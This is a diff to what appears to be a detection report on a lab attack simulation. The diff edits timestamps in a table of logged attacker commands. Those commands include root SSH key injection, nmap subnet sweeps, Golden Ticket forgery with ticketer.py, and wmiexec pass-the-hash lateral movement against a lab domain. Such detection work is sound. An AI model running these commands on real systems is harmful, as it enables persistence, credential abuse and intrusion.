@@ -95,7 +95,7 @@ During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV data 
 | **9144** | 9143 | `17:25:28` | root (33) | `/var/www/.../uploads` | `export TERM=xterm` | Stage 06: Shell Environment Setup |
 | **9148** | 9147 | `17:25:31` | root (33) | `/var/www/.../uploads` | `sudo -l` | Stage 07: Sudo PrivEsc Enumeration |
 | **9155–9158** | 9154–9157 | `17:26:10` | root (0) | `/var/www/.../uploads` | `chmod 700 /root/.ssh && cat .../authorized_keys` | Stage 08: SSH Persistence Preparation |
-| **9164** | 9163 | `17:29:19` | root (0) | `/var/www/.../uploads` | `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> /root/.ssh/authorized_keys` | Stage 08: Root SSH Key Injection |
+| **9164** | 9163 | `17:29:34` | root (0) | `/var/www/.../uploads` | `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> /root/.ssh/authorized_keys` | Stage 08: Root SSH Key Injection |
 | **9170** | 9169 | `17:30:28` | root (0) | `/root` | `hostname && id && ip a` | Stage 09: Pivot Host Discovery |
 | **9184** | 9183 | `17:31:19` | root (0) | `/root` | `nmap -sV -O 192.168.56.0/24 --open` | Stage 09: Internal Subnet Discovery Sweep |
 | **9215** | 9214 | `17:32:27` | root (0) | `/root` | `nmap -sV -O 192.168.232.0/24 --open` | Stage 09: Perimeter Subnet Sweep |
@@ -115,10 +115,10 @@ During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV data 
 | **9306** | 9305 | `18:06:40` | root (0) | `/tmp` | `python3 /usr/local/bin/ticketer.py -nthash 611a8... -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator` | Stage 16: Golden Ticket Forgery (krbtgt KVNO 3) |
 | **9307** | 9306 | `18:06:48` | root (0) | `/tmp` | `export KRB5CCNAME=/tmp/Administrator.ccache` | Stage 16: Kerberos Cache Initialization |
 | **9373** | 9372 | `18:14:50` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 17: Golden Ticket Lateral WMI to DC |
-| **9391** | 9390 | `18:16:34` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 18: Workstation Lateral WMI Execution |
+| **9391** | 9390 | `18:15:13` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 18: Workstation Lateral WMI Execution |
 | **9393** | 9392 | `18:17:09` | root (0) | `/tmp` | `ls /tmp/domain_users.txt /tmp/admin_info.txt /tmp/sensitive_data.txt` | Stage 18: Staged Data Files Verification |
 | **9443** | 9442 | `18:21:04` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 20: Golden Ticket DC Impact Execution |
-| **9501** | 9500 | `18:24:18` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 20: Workstation Defacement & Reboot |
+| **9501** | 9500 | `18:24:35` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 20: Workstation Defacement & Reboot |
 
 ---
 
